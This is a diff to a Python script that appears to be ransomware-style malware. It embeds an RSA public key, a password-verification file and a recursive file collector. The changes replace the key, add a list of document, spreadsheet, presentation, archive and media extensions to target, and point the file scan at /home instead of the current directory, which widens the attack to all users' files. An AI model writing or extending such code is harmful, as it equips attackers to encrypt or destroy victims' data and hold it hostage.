@@ -21,20 +21,21 @@ USEALWAYSDEFAULTPUBLICPEM = False
 NONCENSIZE=16
 
 public_pem="""-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx4pFJ9974tG7I0cEjcyo
-2tEK8Y+hc3k8rO2z2vlQ76JcTzUACDZ0dFlcNEvVxckT/CrDa4lDmECPF5xF3ykV
-Chkwvj5ZodXAzCV0jrtaGpb7s5sDpXWy6j6kUQeeNo4ObPs3k1RJ+b17SayqSxvR
-ZUUimqKZ0JU24v74YLQ3IvBiduqSQwKOsd5Igt1ToLlkSj8bcR1Jl5+qcfTfcxoA
-wbrmPk4cGn95LkcYumkLiZgxi+36d6Lw2pG+kjZqi6OCp22s1U7qugC9TnXt4ndQ
-K9H0vcCzTuKlMVqXx57zqGmLHX3h5Y77uOw+Qfn4M5oEjoLchksiYv0Y7JexPwmZ
-YwIDAQAB
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy/A9SQT+Bq1Mo4D4M+YV
++XAOEHKSVvW6+Okc3RUnVGxJw7BQUyPZNtUznarLY8/ZO3iptQOKHgA2GWrSlcqB
+f1hgCf5i/Ke7SsxyUHV1M7vEbbIiJMdu94JsHuuRPXNSpOp6HbacmL0z591zXRfB
+nHb1UQCFkLbaU4PJSF2bIdhxY7cb0AfWQGrc6TrbSxsLNFX/K/hOKR5/r2ydy3k+
+jvJJ0kzTnLxFyK6iZBZgRjI8xUVmfnlqgJRTKTYo3sFU8CSTovoDKxHNMu+24StK
+dozmSsWQGP08+oDEfv+oBqXvX1vlyBcVuco7eOiZVcCB6nB4iIkEj9TXzsw4gSzS
+QwIDAQAB
 -----END PUBLIC KEY-----
 """
 
-VERIFICATIONFILE = "verification"
+VERIFICATIONFILE = "verification.txt"
 VERIFICATIONTEXT = "The password is correct"
-HASHFILE = "hash"
-LOGFILE = "log"
+HASHFILE = "hash.txt"
+LOGFILE = "log.txt"
+EXTENSIONS = "pdf doc docx html webp xls ods ppt pptx jar jpg jpeg mp4 mp3 png"
 
 #-------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Methods 
@@ -45,7 +46,6 @@ To create info logs
 def logInfo(text):
     if DEBUG:
         open(LOGFILE,"a").write("INFO    "+text+"\n")
-        #print(text)
 
 
 '''
@@ -54,7 +54,6 @@ To create error logs
 def logError(text):
     if DEBUG:
         open(LOGFILE,"a").write("ERROR   "+text+"\n")
-        #print("ERROR "+text)
 
 
 '''
@@ -284,7 +283,7 @@ def files_recursive(list_files, start):
 
         elif(file != ""):
             #It is a file with an extension
-            if file.split(".")[-1] in  "txt jpg jpeg mp4 mp3 png".split(" "):
+            if file.split(".")[-1] in  EXTENSIONS.split(" "):
                 #It is one of the extensions we are looking for
                 list_files.append(os.path.join(start+"/"+file))
     return list_files
@@ -294,7 +293,7 @@ Create a list of files calling the recursive version of this method
 '''
 def files():
     #Call the recursive method to obtain the list of files
-    list_files = files_recursive([],".")
+    list_files = files_recursive([],"/home")
 
     logInfo("All the files: "+str(", ".join(list_files)))
 
